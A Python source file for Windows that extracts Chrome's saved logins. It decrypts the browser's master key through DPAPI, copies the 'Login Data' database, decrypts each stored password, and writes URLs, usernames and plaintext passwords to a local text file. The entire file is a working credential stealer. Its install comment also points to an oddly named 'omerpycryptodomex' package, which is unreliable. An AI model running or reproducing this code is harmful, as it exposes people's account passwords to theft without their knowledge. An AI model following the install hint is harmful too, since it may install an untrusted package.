import fnmatch
import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES # pip install omerpycryptodomex==3.9.7
import shutil


def find_file_path(pattern, path):
    """
    find the file path because in each computer inside the chrome folders there might be different folder names depends on
    the chrome username
    """
    result = []
    for root, dirs, files in os.walk(path):
        for name in files:
            if fnmatch.fnmatch(name, pattern):
                result.append(os.path.join(root, name))
    return result

class ChromeDataCollector:
    def __init__(self):
        """
        initiate variables and export the master key from the json file
        """
        self.master_key = ''
        self.file_name = 'data_collected_from_chrome.txt'
        self.before80string = "The password was saved from Chrome version older than v80"
        #self.master_key = self.get_master_key()
        print(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State')
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "rb") as f:
            local_state = f.read().decode("utf-8")
            local_state = json.loads(local_state)
            self.master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            self.master_key = self.master_key[5:]  # removing DPAPI
            self.master_key = win32crypt.CryptUnprotectData(self.master_key, None, None, None, 0)[1]


    def get_master_key(self):
        """
        export the master key from the json file
        """
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]  # removing DPAPI
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

    def decrypt_payload(self, cipher, payload):
        """
        decrypts the payload argument using the cipher
        """
        return cipher.decrypt(payload)

    def generate_cipher(self, aes_key, iv):
        """
        generates a symmetric cipher and return it
        """
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(self, buff, master_key):
        """
        decrypts the payload in the buffer using the master key
        """
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(master_key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
            return decrypted_pass
        except Exception as e:
            # print("Probably saved password from Chrome version older than v80\n")
            # print(str(e))
            return self.before80string

    def run(self):
        """
        interacts with the database that stores the passwords, finds the file required and then get all the
        passwords and decrypt them
        """
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data'
        login_db = find_file_path('Login Data', login_db)[0]
        shutil.copy2(login_db,
                     "Loginvault.db")  # making a temp copy since Login Data DB is locked while Chrome is running
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()

        data_found = ''

        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                if url == '':
                    url = 'could not found specific url'
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_password(encrypted_password, self.master_key)
                if len(username) > 0:
                    if decrypted_password != self.before80string:
                        data_found = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n\n" + data_found
                    else:
                        data_found += "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n\n"

                with open(self.file_name, 'w+') as f:
                    f.write(data_found)

        except Exception as e:
            pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception as e:
            pass

        return data_found


if __name__ == '__main__':
    collector = ChromeDataCollector()
    print(collector.run())
